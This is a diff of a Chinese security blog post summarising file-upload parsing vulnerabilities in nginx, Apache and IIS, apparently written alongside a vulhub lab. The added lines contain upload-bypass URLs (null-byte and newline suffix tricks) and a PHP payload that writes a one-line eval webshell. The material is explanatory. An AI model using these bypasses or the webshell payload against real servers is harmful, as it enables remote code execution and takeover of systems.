@@ -130,18 +130,18 @@
 
 
 
-  <meta name="description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造">
+  <meta name="description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx &amp;lt;8.03 空字节代码执行漏洞影响版本：0.5.,0.6., 0.7 &amp;lt;= 0.7.65, 0.8 &amp;lt;= 0.8.37 上传图片马然后这样访问： 1hack.jpg%00.php 就会执行PHP代码 nginx 1.6.21http://www.test.com/1.">
 <meta name="keywords" content="解析漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传解析漏洞小结">
-<meta property="og:url" content="https://clancyb00m.github.io/2019/01/20/解析漏洞/index.html">
+<meta property="og:url" content="https://clancyb00m.github.io/2019/01/20/文件上传解析漏洞/index.html">
 <meta property="og:site_name" content="T0mmclancy`s Blog">
-<meta property="og:description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造">
+<meta property="og:description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx &amp;lt;8.03 空字节代码执行漏洞影响版本：0.5.,0.6., 0.7 &amp;lt;= 0.7.65, 0.8 &amp;lt;= 0.8.37 上传图片马然后这样访问： 1hack.jpg%00.php 就会执行PHP代码 nginx 1.6.21http://www.test.com/1.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-01-20T05:02:41.646Z">
+<meta property="og:updated_time" content="2019-01-20T05:41:31.096Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件上传解析漏洞小结">
-<meta name="twitter:description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造">
+<meta name="twitter:description" content="前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx &amp;lt;8.03 空字节代码执行漏洞影响版本：0.5.,0.6., 0.7 &amp;lt;= 0.7.65, 0.8 &amp;lt;= 0.8.37 上传图片马然后这样访问： 1hack.jpg%00.php 就会执行PHP代码 nginx 1.6.21http://www.test.com/1.">
 
 
 
@@ -150,7 +150,7 @@
 
 
 
-  <link rel="canonical" href="https://clancyb00m.github.io/2019/01/20/解析漏洞/">
+  <link rel="canonical" href="https://clancyb00m.github.io/2019/01/20/文件上传解析漏洞/">
 
 
 
@@ -375,7 +375,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://clancyb00m.github.io/2019/01/20/解析漏洞/">
+    <link itemprop="mainEntityOfPage" href="https://clancyb00m.github.io/2019/01/20/文件上传解析漏洞/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="clancy">
@@ -417,7 +417,7 @@
                 
               
 
-              <time title="创建时间：2019-01-20 13:02:00 / 修改时间：13:02:41" itemprop="dateCreated datePublished" datetime="2019-01-20T13:02:00+08:00">2019-01-20</time>
+              <time title="创建时间：2019-01-20 13:02:00 / 修改时间：13:41:31" itemprop="dateCreated datePublished" datetime="2019-01-20T13:02:00+08:00">2019-01-20</time>
             
 
             
@@ -435,7 +435,7 @@
 
           
           
-             <span id="/2019/01/20/解析漏洞/" class="leancloud_visitors" data-flag-title="文件上传解析漏洞小结">
+             <span id="/2019/01/20/文件上传解析漏洞/" class="leancloud_visitors" data-flag-title="文件上传解析漏洞小结">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -468,7 +468,11 @@
 
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里有一个集合了好多解析漏洞的地方：<a href="https://github.com/clancyb00m/vulhub" target="_blank" rel="noopener">vulhub-github</a>，但其实它是一个漏洞靶场</p>
-<h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="nginx-1-6-2"><a href="#nginx-1-6-2" class="headerlink" title="nginx 1.6.2"></a>nginx 1.6.2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/1.txt/hack.php</span><br></pre></td></tr></table></figure>
+<h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="nginx-lt-8-03-空字节代码执行漏洞"><a href="#nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="nginx &lt;8.03 空字节代码执行漏洞"></a>nginx &lt;8.03 空字节代码执行漏洞</h2><p>影响版本：0.5.<em>,0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>
+<p>上传图片马然后这样访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jpg%00.php</span><br></pre></td></tr></table></figure>
+<p>就会执行PHP代码</p>
+<h2 id="nginx-1-6-2"><a href="#nginx-1-6-2" class="headerlink" title="nginx 1.6.2"></a>nginx 1.6.2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/1.txt/hack.php</span><br></pre></td></tr></table></figure>
 <p>如果<code>hack.php</code>不存在，就会以<code>.php</code>后缀去执行<code>1.txt</code>，所以最后执行的其实是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/1.php</span><br></pre></td></tr></table></figure>
 <h2 id="nginx-1-x-php-7-x"><a href="#nginx-1-x-php-7-x" class="headerlink" title="nginx 1.x + php 7.x"></a>nginx 1.x + php 7.x</h2><p>该漏洞属于用户配置不当造成的解析漏洞</p>
@@ -482,15 +486,17 @@
 <p>上传<code>1.php.haha</code>的文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.test.com/1.php.haha</span><br></pre></td></tr></table></figure>
 <p><code>haha</code>后缀不存在，Apache会左移寻找能解析的后缀，所以最后会解析1.php的内容</p>
-<h2 id="apache-2-4-0-2-4-29"><a href="#apache-2-4-0-2-4-29" class="headerlink" title="apache 2.4.0~2.4.29"></a>apache 2.4.0~2.4.29</h2><p><strong>CVE-2017-15715</strong></p>
+<h2 id="apache-2-4-0-2-4-29"><a href="#apache-2-4-0-2-4-29" class="headerlink" title="apache 2.4.0~2.4.29"></a>apache 2.4.0~2.4.29</h2><ol>
+<li><strong>CVE-2017-15715</strong></li>
+</ol>
 <p>直接上传一个<code>1.php</code>文件，然后抓包在后缀名后添加<code>\x0a</code>，然后访问如下网址：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.test.com/1.php\x0a</span><br></pre></td></tr></table></figure>
 <h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6"><a href="#IIS-6" class="headerlink" title="IIS 6"></a>IIS 6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.test.com/1.asp.jpg</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.test.com/1.asp/1.jpg</span><br></pre></td></tr></table></figure>
-<h2 id="IIS-7-5"><a href="#IIS-7-5" class="headerlink" title="IIS 7.5"></a>IIS 7.5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.jpg是一个图片马，1.php不存在</span><br><span class="line">www.test.com/a.jpg/1.php</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>未完待续······</p>
-</blockquote>
+<h2 id="IIS-7-5"><a href="#IIS-7-5" class="headerlink" title="IIS 7.5"></a>IIS 7.5</h2><p>IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞</p>
+<p>在默认Fast-CGI开启的情况下，上传一个hack.jpg文件，内容中包含：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;])?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问hack.jpg/.php，就会在这个目录下生成一句话木马<code>shell.php</code></p>
 
       
     </div>
@@ -737,7 +743,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx"><span class="nav-number">2.</span> <span class="nav-text">nginx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-1-6-2"><span class="nav-number">2.1.</span> <span class="nav-text">nginx 1.6.2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-1-x-php-7-x"><span class="nav-number">2.2.</span> <span class="nav-text">nginx 1.x + php 7.x</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#apache"><span class="nav-number">3.</span> <span class="nav-text">apache</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#apache-2-2-x"><span class="nav-number">3.1.</span> <span class="nav-text">apache 2.2.x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache-2-4-0-2-4-29"><span class="nav-number">3.2.</span> <span class="nav-text">apache 2.4.0~2.4.29</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS"><span class="nav-number">4.</span> <span class="nav-text">IIS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-6"><span class="nav-number">4.1.</span> <span class="nav-text">IIS 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-7-5"><span class="nav-number">4.2.</span> <span class="nav-text">IIS 7.5</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx"><span class="nav-number">2.</span> <span class="nav-text">nginx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-lt-8-03-空字节代码执行漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">nginx &lt;8.03 空字节代码执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-1-6-2"><span class="nav-number">2.2.</span> <span class="nav-text">nginx 1.6.2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-1-x-php-7-x"><span class="nav-number">2.3.</span> <span class="nav-text">nginx 1.x + php 7.x</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#apache"><span class="nav-number">3.</span> <span class="nav-text">apache</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#apache-2-2-x"><span class="nav-number">3.1.</span> <span class="nav-text">apache 2.2.x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache-2-4-0-2-4-29"><span class="nav-number">3.2.</span> <span class="nav-text">apache 2.4.0~2.4.29</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS"><span class="nav-number">4.</span> <span class="nav-text">IIS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-6"><span class="nav-number">4.1.</span> <span class="nav-text">IIS 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-7-5"><span class="nav-number">4.2.</span> <span class="nav-text">IIS 7.5</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -796,7 +802,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共26.4k字</span>
+  <span class="post-count">博客全站共26.5k字</span>
 </div>
         
 
@@ -913,7 +919,7 @@
   
     <script type="text/javascript">
       window.livereOptions = {
-        refer: '2019/01/20/解析漏洞/'
+        refer: '2019/01/20/文件上传解析漏洞/'
       };
       (function(d, s) {
         var j, e = d.getElementsByTagName(s)[0];
